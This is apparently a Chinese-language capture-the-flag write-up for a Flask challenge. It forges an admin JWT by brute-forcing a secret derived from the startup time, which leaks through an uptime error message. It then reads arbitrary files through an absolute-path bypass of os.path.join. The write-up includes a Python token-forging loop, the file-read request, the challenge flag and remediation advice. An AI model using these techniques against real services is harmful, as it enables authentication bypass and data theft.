# Random

## 题目简述

Flask 应用启动时令 `APP_SECRET = SHA256(round(time.time()))`，用它签发 HS256 JWT。错误响应泄露运行时长，足以反推出启动秒数。管理员接口又错误处理绝对路径，组合后可读取任意文件。

## 解题过程

带一个错误 `session` Cookie 请求任意 API。JWT 解码失败后，异常页包含：

```text
This system has been up for <N> seconds
```

用当前时间减去 uptime 得到候选启动时间，并对网络延迟与四舍五入造成的误差枚举几秒：

```python
now = round(time.time())
for delta in range(-3, 4):
    started = now - uptime + delta
    secret = hashlib.sha256(str(started).encode()).hexdigest()
    token = jwt.encode({"userid": 0}, secret, algorithm="HS256")
    # 请求 /api/files 验证候选
```

成功伪造 `userid=0` 后，`/api/file` 只循环删除 `../`，却把剩余名称交给：

```python
open(os.path.join("files/", filename), "rb")
```

在 POSIX 上，如果 `filename` 是绝对路径，`os.path.join` 会丢弃前面的 `files/`。请求：

```text
/api/file?filename=/proc/self/cwd/flag.txt
```

读取到 `byuctf{expl01t_chains_involve_multiple_exploits_in_a_row}`。

## 方法总结

可预测时间不是应用密钥；泄露 uptime 后，搜索空间仅剩数秒。路径防护也不能靠删除 `../`：应解析并规范化路径，拒绝绝对路径，再验证最终路径仍位于允许根目录内。
